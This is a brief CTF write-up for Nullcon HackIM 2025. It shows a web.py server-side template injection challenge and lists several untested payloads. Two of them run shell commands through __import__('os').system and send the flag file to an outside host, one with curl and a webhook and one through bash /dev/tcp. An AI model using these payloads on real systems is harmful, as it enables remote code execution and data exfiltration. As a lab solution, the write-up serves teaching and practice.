Full clear writeups at https://mindcrafters.xyz/writeups/nullconctf-2025-web/
Everything but zoney.eno at https://aftabsama.com/writeups/ctf/nullcon-hackim-ctf-goa-2025/

# Temptation
#langs/python 
#libs/webdotpy
A SSTI challenge where our input is directly passed to the templating system. The goal is to override the template to only return `FLAG`
```python
...
    def POST(self):
        f = temptation_Form()
        if not f.validates():
            return render.index(f)
        i = web.input()
        temptation = i.temptation
        if 'flag' in temptation.lower():
            return "Too tempted!"
        try:
            temptation = web.template.Template(f"Your temptation is: {temptation}")()
        except Exception as  e:
            return "Too tempted!"
        if str(temptation) == "FLAG":
            return FLAG
        else:
            return "Too tempted!"
...
```
I haven't really seen any SSTI guides for web.py, so I'll just include a bunch of solutions for this challenge here. Weirdly, web.py [promotes itself as having a secure templating system](https://webpy.org/docs/0.3/templetor#security), yet some solves seem to say otherwise.
Solutions (All untested):
Updating template
```python
$code:
    self.update({"__body__": "FL"+"AG"})
```
Stealing flag directly
```python
$__import__('os').system('curl+http://webhook/`cat+/tmp/f*.txt`') 
```
Similar to above but without curl
```python
$__import__('os').system('bash -c "cat /tmp/fla* > /dev/tcp/{ip}/{port}"')
```
# ZONEy.eno
#misc/dns
Writeup at https://blog.n0va.in/posts/nullcon-writeup/